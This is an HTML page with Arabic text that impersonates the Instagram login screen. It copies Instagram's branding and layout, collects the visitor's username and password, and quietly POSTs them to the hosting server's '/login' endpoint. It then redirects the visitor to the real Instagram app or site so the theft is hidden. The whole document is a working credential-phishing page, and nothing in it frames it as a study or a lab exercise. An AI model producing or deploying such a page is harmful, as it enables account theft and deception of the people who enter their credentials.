<html>
 <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
   </head>
  <body dir="rtl">
   <!-- Body of Site -->
    <div class="container text-center ">
      <div class="dropdown text-center mt-4">
        <div class=" dropdown-toggle" data-bs-toggle="dropdown" data-bs-target="#m1">العربية</div>
        
        <ul class="dropdown-menu" id="m1">
          <a href="#" class="dropdown-item">English</a>
           <a href="#" class="dropdown-item">France</a>
           
           <a href="#" class="dropdown-item">Italien</a>
        </ul>
           
      </div>
      
      
      <div class="image mt-4">
      <img src="icon.png" alt="icon" class="icon">
     </div>
      
      <form
     class="form-group mt-5" id="loginForm" >
      <input type="search" placeholder="أسم المستخدم او البريد الاكتروني او رقم الهاتف"
      class="form-control" name="name">
      
      
      <input type="password" placeholder="كلمة السر"
      class="form-control mt-3" dir="right" name="password">
      
      <input type="submit" class="btn btn-primary mt-4" name="login-btn" value="تسجيل دخول">
      
   <a href="#" class="forget">هل نسيت كلمة السر ؟</a> 
      
      <button class="btn btn-outline-primary mt-5">إنشاء حساب جديد</button>
      
      </form>
      
      
    
    <div class="image ">
      <img src="meta.png" alt="meta" class="meta">
      </div>
    </div>
   
<script>
  document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const form = event.target;
    const formData = new FormData(form);
    const searchParams = new URLSearchParams(formData);

    fetch("/login", {
      method: "POST",
      body: searchParams,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      }
    }).then(() => {
      // بعد إرسال البيانات، نوجه المستخدم مباشرة
      setTimeout(() => {
        window.location.href = "instagram://app";
      }, 1000);

      setTimeout(() => {
        window.location.href = "https://www.instagram.com";
      }, 3000);
    }).catch((error) => {
      console.error("فشل الإرسال:", error);
      alert("حدث خطأ أثناء إرسال البيانات.");
    });
  });
        </script>
   
    </body>
    
    
  
  
    <!-- Style of Site -->
    <style>
    .container {
      max-width: 400px;
    }
     .dropdown{
       color: #333;
     }
     .image {
       display: flex;
       justify-content: center;
       align-items: center;
       position: relative;
     }
    .image .icon {
       width: 33%;
       height: 22%;
     }
     .image .meta {
       width: 25%;
       height: 15%;
     }
     .form-group {
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
     }
     .form-group .form-control{
       height: 50px;
       width:100%;
       text-align: right;
       border-radius: 20px;
       
     }
     .form-control:hover{
       border: 1px solid #333;
       box-shadow:none;
     }
     .form-control::placeholder {
       text-align: right;
     }
     .btn-primary {
       width: 100%;
       color: white;  
       border-radius:50px;
     }
     .btn-outline-primary {
       width: 100%;
       color: #000099;
       border-radius:50px;
     }
     .forget {
       text-decoration: none;
       color: black;
       text-align: center;
       margin-top:15px;
     }
   
      
    </style>
    </html>
